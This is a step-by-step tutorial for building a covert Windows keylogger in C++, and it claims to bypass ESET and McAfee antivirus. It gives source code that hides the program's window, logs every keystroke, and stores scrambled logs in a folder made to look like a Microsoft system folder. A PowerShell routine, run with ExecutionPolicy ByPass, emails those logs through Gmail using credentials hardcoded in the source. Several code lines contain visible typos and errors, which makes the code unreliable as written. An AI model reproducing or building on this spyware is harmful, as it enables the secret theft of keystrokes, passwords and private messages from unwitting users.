# Keylogger
THIS KEYLOGGER IS ABLE TO BYPASS ANTIVIRUS PROTECTION. IT HAS BEEN TESTED IN NOD ESET, MCAFEE. THIS
DON'T WORKS FOR WINDOWS 7, 8, 8.1, 10.
THIS KEYLOGGER IS INDEPENDENT OF THE SORT OF KEYBOARD LIKE LANGUAGE SETTINGS THAT SOMEBODY HAS ON
THEIR COMPUTERS.

IN CODEBLOCKS, CREATE A NEW PROJECT AS "CONSOLE APPLICATION", AND FOR THE PROJECT NAME, I NAME IT
"Keylogger", YOU CAN NAME IT AS YOU WANT. 
NOW, YOU HAVE YOUR PROJECT, GO TO SETTINGS AND CLICK ON "COMPILER", LET'S CHECK THE "C++11".
NEXT, CLICK RIGHT AND DO CLICK IN "CREATE FLAG", THEN, NAME IT "WindowsAPI", IN COMPILER FLAGS NAME IT
"-mwindows" AND IN LINKER FLAGS NAME IT "-mwindows".

FOR THE KEYLOGGER, I WILL EXPLAIN ONLY THE PARTS RELEVANT TO US, NOT ALL THE EXISTING DOCUMENTATION,
FOR THAT VISIT MSDN, BECAUSE WE ARE GOING TO USE "windows.h".

ONE VERY IMPORTANT ASPECT OF THIS KEYLOGGER, WE'LL BE ABLE TO SEND EMAILS WITH INFORMATION THAT THE KEYLOGGER
GETS.

HIDING THE KEYLOGGER WINDOW:	

	#include <iostream>
	#include <windows.h>

	using namespace std;

	int main()
	{
	    MSG Msg;
	    while(GetMessage(&Msg, NULL, 0, 0))
	    {
	        TranslateMessage(&Msg);
	        DispatchMessage(&Msg);
	    }
	    return 0;
	}

GetMessage takes some sort of a message from us, namely as &Msg, AND THE OTHER THREE VARIABLE REALLY 
CAN JUST LOOK THIS FUNCTION UP ON THE NET, THE WINDOWS HAS THIS VERY VERY WELL DOCUMENTED. BUT, I'M
JUST EXPLAINING THE RELEVANT PART FOR US (REMEMBER THAT).
TranslateMessage WILL TAKE A MESSAGE FROM OUR PROGRAM THAT IS INTENDED FOR A CERTAIN WINDOW FOR ANY 
WINDOW WITHIN WINDOWS THAT WE HAVE SPECIFIED, AND THEN IT WILL MODIFY THAT PARTICULAR MESSAGE WITH THE
"Msg".
DispatchMessage FORWARDS THIS "Msg" PARTICULAR MESSAGE TO THE SYSTEM.
THE MESSAGE THAT WE ARE EXPECTING TO GET, THAT WE ARE EXPECTING TO TRANSLATE FORWARD, IS NEVER GOING
TO HAPPEN. IT'S JUST NOT GOING HAPPEN.

KeyCONSTANTS:
CREATE A HEADER FILE WITH THE NAME "KeyConstants.h".

	#ifndef KEYCONSTANTS_H
	#define KEYCONSTANTS_H
	#include <map>
	#include <string>

	//vk = VIRTUAL KEY
	class KeyPair
	{
    	public:
        	KeyPair(const std::string &vk = "", const std::string &name = "") : VKName(vk), Name(name){}
        	std::string VKName;
        	std::string Name;
	};

	class Keys
	{
    	public:
        	static std::map<int, KeyPair> KEYS;
	};

	map<int, KeyPair> Keys::KEYS = {
    	{0xC1, {"[VK_ABNT_C1]", "[Abnt C1]"}},
    {0xC2, {"[VK_ABNT_C2]", "[Abnt C2]"}},
    {0x6B, {"[VK_ADD]", "[Numpad +]"}},
    {0xF6, {"[VK_ATTN]", "[Attn]"}},
    {0x08, {"[VK_BACK]", "[Backspace]"}},
    {0x03, {"[VK_CANCEL]", "[Break]"}},
    {0x0C, {"[VK_CLEAR]", "[Clear]"}},
    {0xF7, {"[VK_CRSEL]", "[Cr Sel]"}},
    {0x6E, {"[VK_DECIMAL]", "[Numpad .]"}},
    {0x6F, {"[VK_DIVIDE]", "[Numpad /]"}},
    {0xF9, {"[VK_EREOF]", "[Er Eof]"}},
    {0x1B, {"[VK_ESCAPE]", "[Esc]"}},
    {0x2B, {"[VK_EXECUTE]", "[Execute]"}},
    {0xF8, {"[VK_EXSEL]", "[Ex Sel]"}},
    {0xE6, {"[VK_ICO_CLEAR]", "[IcoClr]"}},
    {0xE3, {"[VK_ICO_HELP]", "[IcoHlp]"}},
    {0x30, {"[VK_KEY_0]", "[D0]"}},
    {0x31, {"[VK_KEY_1]", "[D1]"}},
    {0x32, {"[VK_KEY_2]", "[D2]"}},
    {0x33, {"[VK_KEY_3]", "[D3]"}},
    {0x34, {"[VK_KEY_4]", "[D4]"}},
    {0x35, {"[VK_KEY_5]", "[D5]"}},
    {0x36, {"[VK_KEY_6]", "[D6]"}},
    {0x37, {"[VK_KEY_7]", "[D7]"}},
    {0x38, {"[VK_KEY_8]", "[D8]"}},
    {0x39, {"[VK_KEY_9]", "[D9]"}},
    {0x41, {"[VK_KEY_A]", "[A]"}},
    {0x42, {"[VK_KEY_B]", "[B]"}},
    {0x43, {"[VK_KEY_C]", "[C]"}},
    {0x44, {"[VK_KEY_D]", "[D]"}},
    {0x45, {"[VK_KEY_E]", "[E]"}},
    {0x46, {"[VK_KEY_F]", "[F]"}},
    {0x47, {"[VK_KEY_G]", "[G]"}},
    {0x48, {"[VK_KEY_H]", "[H]"}},
    {0x49, {"[VK_KEY_I]", "[I]"}},
    {0x4A, {"[VK_KEY_J]", "[J]"}},
    {0x4B, {"[VK_KEY_K]", "[K]"}},
    {0x4C, {"[VK_KEY_L]", "[L]"}},
    {0x4D, {"[VK_KEY_M]", "[M]"}},
    {0x4E, {"[VK_KEY_N]", "[N]"}},
    {0x4F, {"[VK_KEY_O]", "[O]"}},
    {0x50, {"[VK_KEY_P]", "[P]"}},
    {0x51, {"[VK_KEY_Q]", "[Q]"}},
    {0x52, {"[VK_KEY_R]", "[R]"}},
    {0x53, {"[VK_KEY_S]", "[S]"}},
    {0x54, {"[VK_KEY_T]", "[T]"}},
    {0x55, {"[VK_KEY_U]", "[U]"}},
    {0x56, {"[VK_KEY_V]", "[V]"}},
    {0x57, {"[VK_KEY_W]", "[W]"}},
    {0x58, {"[VK_KEY_X]", "[X]"}},
    {0x59, {"[VK_KEY_Y]", "[Y]"}},
    {0x5A, {"[VK_KEY_Z]", "[Z]"}},
    {0x6A, {"[VK_MULTIPLY]", "[Numpad *]"}},
    {0xFC, {"[VK_NONAME]", "[NoName]"}},
    {0x60, {"[VK_NUMPAD0]", "[N0]"}},
    {0x61, {"[VK_NUMPAD1]", "[N1]"}},
    {0x62, {"[VK_NUMPAD2]", "[N2]"}},
    {0x63, {"[VK_NUMPAD3]", "[N3]"}},
    {0x64, {"[VK_NUMPAD4]", "[N4]"}},
    {0x65, {"[VK_NUMPAD5]", "[N5]"}},
    {0x66, {"[VK_NUMPAD6]", "[N6]"}},
    {0x67, {"[VK_NUMPAD7]", "[N7]"}},
    {0x68, {"[VK_NUMPAD8]", "[N8]"}},
    {0x69, {"[VK_NUMPAD9]", "[N9]"}},
    {0xBA, {"[VK_OEM_1]", "[OEM_1 (: ;)]"}},
    {0xE2, {"[VK_OEM_102]", "[OEM_102 (> <)]"}},
    {0xBF, {"[VK_OEM_2]", "[OEM_2 (? /)]"}},
    {0xC0, {"[VK_OEM_3]", "[OEM_3 (~ `)]"}},
    {0xDB, {"[VK_OEM_4]", "[OEM_4 ({ [)]"}},
    {0xDC, {"[VK_OEM_5]", "[OEM_5 (| \\)]"}},
    {0xDD, {"[VK_OEM_6]", "[OEM_6 (} ])]"}},
    {0xDE, {"[VK_OEM_7]", "[OEM_7 (\" ')]"}},
    {0xDF, {"[VK_OEM_8]", "[OEM_8 (§ !)]"}},
    {0xF0, {"[VK_OEM_ATTN]", "[Oem Attn]"}},
    {0xF3, {"[VK_OEM_AUTO]", "[Auto]"}},
    {0xE1, {"[VK_OEM_AX]", "[Ax]"}},
    {0xF5, {"[VK_OEM_BACKTAB]", "[Back Tab]"}},
    {0xFE, {"[VK_OEM_CLEAR]", "[OemClr]"}},
    {0xBC, {"[VK_OEM_COMMA]", "[OEM_COMMA (< ,)]"}},
    {0xF2, {"[VK_OEM_COPY]", "[Copy]"}},
    {0xEF, {"[VK_OEM_CUSEL]", "[Cu Sel]"}},
    {0xF4, {"[VK_OEM_ENLW]", "[Enlw]"}},
    {0xF1, {"[VK_OEM_FINISH]", "[Finish]"}},
    {0x95, {"[VK_OEM_FJ_LOYA]", "[Loya]"}},
    {0x93, {"[VK_OEM_FJ_MASSHOU]", "[Mashu]"}},
    {0x96, {"[VK_OEM_FJ_ROYA]", "[Roya]"}},
    {0x94, {"[VK_OEM_FJ_TOUROKU]", "[Touroku]"}},
    {0xEA, {"[VK_OEM_JUMP]", "[Jump]"}},
    {0xBD, {"[VK_OEM_MINUS]", "[OEM_MINUS (_ -)]"}},
    {0xEB, {"[VK_OEM_PA1]", "[OemPa1]"}},
    {0xEC, {"[VK_OEM_PA2]", "[OemPa2]"}},
    {0xED, {"[VK_OEM_PA3]", "[OemPa3]"}},
    {0xBE, {"[VK_OEM_PERIOD]", "[OEM_PERIOD (> .)]"}},
    {0xBB, {"[VK_OEM_PLUS]", "[OEM_PLUS (+ =)]"}},
    {0xE9, {"[VK_OEM_RESET]", "[Reset]"}},
    {0xEE, {"[VK_OEM_WSCTRL]", "[WsCtrl]"}},
    {0xFD, {"[VK_PA1]", "[Pa1]"}},
    {0xE7, {"[VK_PACKET]", "[Packet]"}},
    {0xFA, {"[VK_PLAY]", "[Play]"}},
    {0xE5, {"[VK_PROCESSKEY]", "[Process]"}},
    {0x0D, {"[VK_RETURN]", "[Enter]"}},
    {0x29, {"[VK_SELECT]", "[Select]"}},
    {0x6C, {"[VK_SEPARATOR]", "[Separator]"}},
    {0x20, {"[VK_SPACE]", "[Space]"}},
    {0x6D, {"[VK_SUBTRACT]", "[Num -]"}},
    {0x09, {"[VK_TAB]", "[Tab]"}},
    {0xFB, {"[VK_ZOOM]", "[Zoom]"}},
    {0x1E, {"[VK_ACCEPT]", "[Accept]"}},
    {0x5D, {"[VK_APPS]", "[Context Menu]"}},
    {0xA6, {"[VK_BROWSER_BACK]", "[Browser Back]"}},
    {0xAB, {"[VK_BROWSER_FAVORITES]", "[Browser Favorites]"}},
    {0xA7, {"[VK_BROWSER_FORWARD]", "[Browser Forward]"}},
    {0xAC, {"[VK_BROWSER_HOME]", "[Browser Home]"}},
    {0xA8, {"[VK_BROWSER_REFRESH]", "[Browser Refresh]"}},
    {0xAA, {"[VK_BROWSER_SEARCH]", "[Browser Search]"}},
    {0xA9, {"[VK_BROWSER_STOP]", "[Browser Stop]"}},
    {0x14, {"[VK_CAPITAL]", "[Caps Lock]"}},
    {0x1C, {"[VK_CONVERT]", "[Convert]"}},
    {0x2E, {"[VK_DELETE]", "[Delete]"}},
    {0x28, {"[VK_DOWN]", "[Arrow Down]"}},
    {0x23, {"[VK_END]", "[End]"}},
    {0x70, {"[VK_F1]", "[F1]"}},
    {0x79, {"[VK_F10]", "[F10]"}},
    {0x7A, {"[VK_F11]", "[F11]"}},
    {0x7B, {"[VK_F12]", "[F12]"}},
    {0x7C, {"[VK_F13]", "[F13]"}},
    {0x7D, {"[VK_F14]", "[F14]"}},
    {0x7E, {"[VK_F15]", "[F15]"}},
    {0x7F, {"[VK_F16]", "[F16]"}},
    {0x80, {"[VK_F17]", "[F17]"}},
    {0x81, {"[VK_F18]", "[F18]"}},
    {0x82, {"[VK_F19]", "[F19]"}},
    {0x71, {"[VK_F2]", "[F2]"}},
    {0x83, {"[VK_F20]", "[F20]"}},
    {0x84, {"[VK_F21]", "[F21]"}},
    {0x85, {"[VK_F22]", "[F22]"}},
    {0x86, {"[VK_F23]", "[F23]"}},
    {0x87, {"[VK_F24]", "[F24]"}},
    {0x72, {"[VK_F3]", "[F3]"}},
    {0x73, {"[VK_F4]", "[F4]"}},
    {0x74, {"[VK_F5]", "[F5]"}},
    {0x75, {"[VK_F6]", "[F6]"}},
    {0x76, {"[VK_F7]", "[F7]"}},
    {0x77, {"[VK_F8]", "[F8]"}},
    {0x78, {"[VK_F9]", "[F9]"}},
    {0x18, {"[VK_FINAL]", "[Final]"}},
    {0x2F, {"[VK_HELP]", "[Help]"}},
    {0x24, {"[VK_HOME]", "[Home]"}},
    {0xE4, {"[VK_ICO_00]", "[Ico00 *]"}},
    {0x2D, {"[VK_INSERT]", "[Insert]"}},
    {0x17, {"[VK_JUNJA]", "[Junja]"}},
    {0x15, {"[VK_KANA]", "[Kana]"}},
    {0x19, {"[VK_KANJI]", "[Kanji]"}},
    {0xB6, {"[VK_LAUNCH_APP1]", "[App1]"}},
    {0xB7, {"[VK_LAUNCH_APP2]", "[App2]"}},
    {0xB4, {"[VK_LAUNCH_MAIL]", "[Mail]"}},
    {0xB5, {"[VK_LAUNCH_MEDIA_SELECT]", "[Media]"}},
    {0x01, {"[VK_LBUTTON]", "[Left Button **]"}},
    {0xA2, {"[VK_LCONTROL]", "[Left Ctrl]"}},
    {0x25, {"[VK_LEFT]", "[Arrow Left]"}},
    {0xA4, {"[VK_LMENU]", "[Left Alt]"}},
    {0xA0, {"[VK_LSHIFT]", "[Left Shift]"}},
    {0x5B, {"[VK_LWIN]", "[Left Win]"}},
    {0x04, {"[VK_MBUTTON]", "[Middle Button **]"}},
    {0xB0, {"[VK_MEDIA_NEXT_TRACK]", "[Next Track]"}},
    {0xB3, {"[VK_MEDIA_PLAY_PAUSE]", "[Play / Pause]"}},
    {0xB1, {"[VK_MEDIA_PREV_TRACK]", "[Previous Track]"}},
    {0xB2, {"[VK_MEDIA_STOP]", "[Stop]"}},
    {0x1F, {"[VK_MODECHANGE]", "[Mode Change]"}},
    {0x22, {"[VK_NEXT]", "[Page Down]"}},
    {0x1D, {"[VK_NONCONVERT]", "[Non Convert]"}},
    {0x90, {"[VK_NUMLOCK]", "[Num Lock]"}},
    {0x92, {"[VK_OEM_FJ_JISHO]", "[Jisho]"}},
    {0x13, {"[VK_PAUSE]", "[Pause]"}},
    {0x2A, {"[VK_PRINT]", "[Print]"}},
    {0x21, {"[VK_PRIOR]", "[Page Up]"}},
    {0x02, {"[VK_RBUTTON]", "[Right Button **]"}},
    {0xA3, {"[VK_RCONTROL]", "[Right Ctrl]"}},
    {0x27, {"[VK_RIGHT]", "[Arrow Right]"}},
    {0xA5, {"[VK_RMENU]", "[Right Alt]"}},
    {0xA1, {"[VK_RSHIFT]", "[Right Shift]"}},
    {0x5C, {"[VK_RWIN]", "[Right Win]"}},
    {0x91, {"[VK_SCROLL]", "[Scrol Lock]"}},
    {0x5F, {"[VK_SLEEP]", "[Sleep]"}},
    {0x2C, {"[VK_SNAPSHOT]", "[Print Screen]"}},
    {0x26, {"[VK_UP]", "[Arrow Up]"}},
    {0xAE, {"[VK_VOLUME_DOWN]", "[Volume Down]"}},
    {0xAD, {"[VK_VOLUME_MUTE]", "[Volume Mute]"}},
    {0xAF, {"[VK_VOLUME_UP]", "[Volume Up]"}},
    {0x05, {"[VK_XBUTTON1]", "[X Button 1 **]"}},
    {0x06, {"[VK_XBUTTON2]", "[X Button 2 **]"}},
	};


	#endif // KEYCONSTANTS_H

THIS IS HOW THE SYSTEM REGISTER A KEYSTROKE.
THE MAP HAS THE FOLLOWING SINTAX:
{NOTATION, {"[SYSTEM_NAME]", "[OUR_NAME_FOR_THAT_KEY]"}};

NOW CREATE A HEADER AND NAME IT "Helper.h":

	#ifndef HELPER_H
	#define HELPER_H

	#include <fstream>
	#include <ctime>
	#include <string>
	#include <sstream>

	namespace Helper
	{
    	template <class T>
    	std::string ToString (const T &);

    struct DateTime
    { //START STRUCT
        DateTime ()
        {
            time_t ms;
            time (&ms);
            struct tm *info = localtime(&ms);
            D = info->tm_mday;
            m = info->tm_mon + 1;
            y = 1900 + info->tm_year;
            M = info->tm_min;
            H = info->tm_hour;
            S = info->tm_sec;
        }

        DateTime (int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S) {}
        DateTime (int D, int m, int y): D(D), m(m), y(y), H(0), M(0), S(0) {}

        DateTime Now () const
        {
            return DateTime();
        }

        int D, m, y, H, M, S;

        std::string GetDateString() const
        {
            return std::string(D < 10 ? "0" : "") + ToString (D) +
                   std::string (m < 10 ? ".0" : ".") + ToString (m) + "." +
                   ToString (y);
        }

        std::string GetTimeString(const std::string &sep = ":") const
        {
            return std::string(H < 10 ? "0" : "") + ToString (H) + sep +
                   std::string (M < 10 ? "0" : "") + ToString (M) + sep+
                   std::string (S < 10 ? sep : "") + ToString (S);
        }

        std::string GetDateTimeString (const std::string &sep = ":") const
        {
            return GetDateString () + " " + GetTimeString (sep);
        }

        };//END STRUCT


        template <class T>
        std::string ToString (const T &e)
        {
            std::ostringstream s;
            s << e;
            return s.str();
        }

        void WriteAppLog (const std::string &s)
        {
            std::ofstream file ("AppLog.txt", std::ios::app);

            file << "[" << Helper::DateTime().GetDateTimeString () << "]" << "\n" << s << std::endl << "\n";
            file.close();
        }
	} //END NAMESPACE
	#endif

WE SHALL CREATE A HEADER WITCH WILL BE USED FOR ENCODING AND ENCRYPTING AS WELL. WE ARE GOING TO USE 
BASE64, BASE64 IS NOT REALLY AN ENCRYPTION, IT'S AN ENCODING PROCEDURE. LET'S CREATE A HEADER AND
NAME IT "Base64.h":

	#ifndef BASE_64_H
	#define BASE_64_H
	
	#include <vector>
	#include <string>

	namespace Base64
	{
    	std::string base64_encode(const std::string &);

    const std::string &SALT1 = "LM::TM:BB";
    const std::string &SALT2 = "_:/_77";
    const std::string &SALT3 = "line=wowC++";
    //WE WILL USE THIS FOR SCRAMBLE BASE64

    std::string EncryptB64(std::string s)
    {
        s = SALT1 + s + SALT2 + SALT3;
        s=base64_encode(s);
        a.insert(7, SALT3);
        s+=SALT1;
        s=base64_encode(s);
        s=SALT2+SALT3+SALT1;
        s=base64_encode(s);
        s.insert(1, "L");
        s.insert(7, "M");
        return s;
    }
    //THIS IS OUR FUNCTION FOR ENCRYPTION

    const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string base64_encode(const std::string &s)
    {
        std::string ret;
        int val=0;
        int bits=-6; //THIS WILL BE USED FOR MAP INPUT INTO OUR TABLE
        const unsigned int b63=0x3F; //0x SAYS THAT THIS IS HEXADECIMAL

        for(const auto &c : s)
        {
            val=(val<<8)+c; //IS EQUAL TO val=val*2^8;
            bits+=8;
            while(bits>=0)
            {
                ret.push_back(BASE64_CODES[(val>>bits) &b63]);
                bits-=6;
            }
        }

        if(bits>-6) ret.push_back(BASE64_CODES[((val<<8)>>(bits+8))&b63]);
        while(ret.size()%4) ret.push_back('-');

        return ret;
    	}

	}


	#endif // BASE_64_H


IO HEADER: IN THIS HEADER WE STORE ALL THE FUNCTIONS FOR INPUT/OUTPUT OPERATIONS, LIKE CREATING FILES, READIING FROM
THEM, FINDING PATHS, ETC.
THEN, WE DO:

	#ifndef IO_H
	#define IO_H

	#include <string>
	#include <cstdlib>
	#include <windows.h>
	#include <fstream>

	#include "Helper.h"
	#include "Base64.h"

	namespace IO
	{
    //WE NEED A FUNCTION TO RETRIEVE OUR DESIGNATED FOLDER
    std::string GetOurPath (const bool append_separator = false)
    //IT JUST CHECKS IF THE BACKSLASH IS NEEDED IN HE END OF THE PATH
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }//WE NEED TO RECTIFY THIS FUNCTION WITH ANOTHER ONE
    //EX:
    // "C:\\Users\User\Downloads"
    // IF "User" DOESN'T EXIST
    // "C:\\Users\Downloads"
    //"MkOneDr" WILL FAIL
    //BECAUSE IT WON'T HAVE THE FULL PATH AND IT WON'T BE
    //ABLE TO GO THROUGH IT
    //THEN, WE NEED TO MAKE A BACKUP FUNCTION
    //THAT WILL ACTUALLY CREATE ALL OF THESE PATHS
    //"C:\\Users\Downloads\file", etc.

    bool MKDir(std::string path)
    {
        for(char &c : path)
            if(c=='\\')
            {
                c='\0';
                if(!MkOneDr(path)) return false;
                c= '\\';
            }

        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path=GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_")+".log";

        try
        {
            std::ofstream file(path+name);
            if(!file) return "";
            std::ostringstream s;
            s<<"["<<dt.GetDateTimeString()<<"]"<<
            std::endl<<t<<std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file<<data;
            if(!file) return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }

    	}	
	}//END NAMESPACE

	#endif // IO_H


TIME HEADER: CREATE A HEADER AND NAME IT "TimeHeader.h". 
WE'LL NEED IT FOR PARALLEL CODE EXECUTION. THEN, WE'LL NEED IT FOR DELAYED CODE EXECUTION AND FOR REPEATED CODE
EXECUTION (AND THIS WILL USED FOR CALLING FUNCTIONS WITHIN CERTAIN INTERVALS (OF TIME)).
EX: IF WE WANT TO CALL A FUNCTION EVERY 5 SECONDS, 10 MINUTES OR SOMETHING LIKE THAT, THIS WOULD BE VERY IMPORTANT
FOR OUR MAIL TIMERS. 
WE ARE GOING TO USE "CHRONO" AND "THREAD" LIBRARY.
THREAD LIBRARY: MULTIPLE THREADS CAN RUN SIMULTANEOUSLY WITHIN THE SAME PROCESS. THIS IS VERY IMPORTANT BECAUSE
WE DON'T WANT TO STOP THE LOGGING OF KEYBOARD STROKES WHILE SENDING THE EMAILS. WE WANT TO PROGRAM TO BE ABLE
TO SIMULTANEOUSLY RECORD THE KEYSTROKES, SEND THE EMAIL, TAKE SCREENSHOTS AND POSSIBLY DO A GOOD NUMBER OF OTHER
THE THINGS AT THE SAME TIME. A THREAD BASICALLY IS A PROCESS WITHIN A PROCESS. 
THE DIFFERENCE BETWEEN A PROCESS AND A THREAD, IS THAT MULTIPLE THREADS CAN SHARE THE SAME VARIABLES AND DATA 
SECTIONS, IT USES THE SAME DYNAMIC LIBRARIES AND OPEN FILE DESCRIPTORS.
LET'S START:

	#ifndef TIMER_H
	#define TIMER_H

	#include <thread>
	#include <chrono>

	class Timer
	{
	private:
    	std::thread Thread;
    	bool Alive = false;
    	long CallNumber = -1L;//HOW MANY TIMES WE WOULD TO CALL A CERTAIN FUNCTION
    	long repeat_count = -1L; //WE COUNT THE TIMES THAT A FUNCTIONS IS CALLED
    	std::chrono::milliseconds interval = std::chrono::milliseconds(0);
    	std::function<void(void)> funct = nullptr;
    	//THE FUNCTION ABOVE DOESN'T POINT TO ANY FUNCTION AT THE MOMENT

    void SleepAndRun()
    {
        std::this_thread::sleep_for(interval);
        //this_thread indicates the current thread which created the timer object
        //sleep_for will pause or block the thread for a certain time interval
        if(Alive) Function()();
        //"Function" represents a function that we'll need to call
    }

    void ThreadFunc()
    {
        if(CallNumber==Infinite)
        {
            while(Alive) SleepAndRun();
        } else {
            while(repeat_count--) SleepAndRun();
        }
    }

	public:
    static const long Infinite = -1L;
    Timer(){}
    Timer(const std::function<void(void)> &f):funct (f){}
    Timer(const std::function<void(void)> &f,
          const unsigned long &i,
          const long repeat = Timer::Infinite):funct (f),
                                               interval(std::chrono::milliseconds(i)),
                                               CallNumber(repeat){};

    void Start(bool Async = true)
    {
        if(IsAlive()) return;
        Alive = true;
        repeat_count=CallNumber;
        if(Async) Thread = std::thread(ThreadFunc, this);
        else this->ThreadFunc();
    }

    void Stop()
    {
        Alive = false;
        Thread.join();
    }

    void SetFunction(const std::function<void(void)> &f) {funct = f;}

    bool IsAlive() {return Alive;}

    void RepeatCount(const long r)
    {
        if(Alive) return;
        CallNumber=r;

    }

    long GetLeftCount() const {return repeat_count;}

    long RepeatCound() const {return CallNumber;}

    void SetInterval(const unsigned long &i)
    {
        if(Alive) return;
        interval = std::chrono::milliseconds(i);
    }

    unsigned long Interval() const {return interval.count();}

    const std::function<void(void)> &Function() const {return funct;}
	};

	#endif // TIMER_H

SENDMAIL: WE'RE GOING TO USE POWERSHELL SCRIPT. NOW, IN THE SEARCH ENGINE OF WINDOWS
WRITE "Windows PowerShell ISE", ENTER IN THE PROGRAM AND CREATE A NEW FILE, WRITE THE FOLLOWING CODE:

	Param([String]$Att,[String]$Subj,[String]$Body)

	Function Send-Email
	{
    	Param(
            [Parameter(`
            Mandatory=$true)][String] $To,
            [Parameter(`
            Mandatory=$true)][String] $From,
            [Parameter(`
            Mandatory=$true)][String] $Password,
            [Parameter(`
            Mandatory=$true)][String] $Subject,
            [Parameter(`
            Mandatory=$true)][String] $Body,
            [Parameter(`
            Mandatory=$true)][String] $attachment
          )

    try {
        $Msg = New-Object System.Net.Mail.MailMessage($from, $to, $Subject, $Body) #THIS IS FOR SEND MAIL
        $srv = "smtp.gmail.com"
        if($attachment -ne $null)
        {
            try{
                $Attachments = $attachment -split ("\:\:");
                ForEach($val in $Attachments)
                {
                    $attch = New-Object System.Net.Mail.Attachment($val)
                    $Msg.Attachments.Add($attch)
                }
            }
            catch
            {
                exit 2;
            }

            $Client = New-Object net.Mail.SntpClient($Srv, 587) #SSL PROTOCOL OF GMAIL IS 587
            $Client.EnableSsl = $true
            $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password);
            $Client.Send($Msg)
            Remove-Variable -Name Client
            Remove-Variable -Name Password
            exit 7;
        }
        catch
        {
            exit 3;
        }
    }
    catch
    {
        exit 3;
    }
    try
    {
        Send-Email 
            -attachment $att
            -to "Address of the recipient"
            -Body $Body
            -Subject $Subj
            -password "whatttt"
            -From "Address of the Sender"
    }
    catch
    {
        exit 4;
    }
	}

NOW, WE HAVE TO TRANSLATE THIS INTO A FORMAT SUITABLE FOR A C++ STRING. CREATE A HEADER AND NAME IT "SendMail.h",
NOW, LET'S START CODING:

	#ifndef SEND_MAIL_H
	#define SEND_MAIL_H

	#include <fstream>
	#include <vector>
	#include <windows.h>
	#include "IO.h"
	#include "Timer.h"
	#include "Helper.h"

	#define SCRIPT_NAME "sm.ps1"

	namespace Mail
	{
    #define X_EM_TO "jobs.at.kl@gmail.com"
    #define X_EM_FROM "jobs.at.kl@gmail.com"
    #define X_EM_PASS "Jobs.at.kl"
    const std::string &PowerShellScript =
	"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
	"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
	" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
	"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
	"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
	"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
	"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
	"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
	"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
	"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
	"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
	"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
	"  ForEach ($val in $Attachments)\r\n                    "
	"        {\r\n               "
	"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
	"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
	"}\r\n                catch\r\n                    {\r\n                        exit 2; "
	"\r\n                    }\r\n            }\r\n "
	"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
	"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
	"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
	"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
	"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
	"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
	"Send-EMail -attachment $Att "
	"-To \"" +
 	std::string (X_EM_TO) +
 	"\""
	" -Body $Body -Subject $Subj "
	"-password \"" +
 	std::string (X_EM_PASS) +
  	"\""
	" -From \"" +
 	std::string (X_EM_FROM) +
	"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string $with)
    {
        if(what.empty()) return s;
        size_t sp = 0;
        while((sp=s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with, sp+=with.length);
        return s;
    }

    bool CheckFileExists(const std::string &f)
    {
        std::ifstream file(f);
        return (bool) file;
    }

    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true)+std::string(SCRIPT_NAME));
        if(!script) return false;
        script<<PowerShellScript;
        if(!scrip) return false;
        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool ok;
        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok) return -1;
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(src_path)) ok = CreateScript();
        if(!ok) return -2;

        std::string param="-ExecutionPolicy ByPass -File \""+src_path+"\" -Subj \""
                          +StringReplace(subject, "\"", "\\\"")
                          +"\" -Body \""
                          +StringReplace(body, "\"", "\\\"")
                          +"\" -Att \"" + attachments+"\"";

        SHELLEXECUTEINFO ShExecInfo;
        ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask=SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd=NULL; //HANDLE TO A WINDOW
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile="powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
